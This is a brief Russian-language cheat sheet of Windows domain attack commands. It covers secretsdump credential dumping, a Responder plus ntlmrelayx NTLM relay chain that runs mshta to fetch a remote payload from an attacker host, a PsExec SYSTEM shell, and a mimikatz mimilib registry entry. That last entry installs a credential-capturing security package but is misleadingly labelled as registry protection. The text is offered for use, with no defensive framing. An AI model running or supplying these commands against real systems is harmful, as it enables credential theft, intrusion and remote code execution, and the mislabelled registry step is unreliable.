Secretsdump

Получение копии областей памяти LSA SAM SECURITY NTDS.dit На вход нужен пароль или хеш Выполняет открытие SCM(Service Control Manager) и доступ к реестру winreg secretsdump -debug -system SYSTEM -sam SAM -ntds NTDS -security SECURITY -bootkey BOOTKEY -outputfile 1.txt -use-vss -exec-method mmcexec -user-status -dc-ip 10.10.10.1 -target-ip 10.10.10.1 user:pass

CrackMapExec (CME). Powered by Impacket

Содержит модули bloodhound, mimikatz, внедрение Empire_agent, meterpreter

Создать список хостов, которые поддерживают атаку ntlmrelay cme smb <CIDR> --gen-relay-list targets.txt

Responder

для атаки релея необходимо отключить Responder.conf file and turn off the SMB and HTTP servers: SMB = Off HTTP = Off

запуск в одном терминале: Responder.py -I <interface> -r -d -w в другом: ntlmrelayx.py -tf targets.txt а лучше: ntlmrelayx.py -tf targets.txt -c <any code launcher, kodiac ex> или ntlmrelayx.py -tf targets.txt -smb2support --enum-local-admins -of 'NTLMv2hsh.txt' -c 'mshta http://myip:4444/kodiak'

Psexec

запуск локально cmd с правами системы: PsExec.exe -s -i cmd

mimikaz

Защита реестра. Надо добавить: reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /f
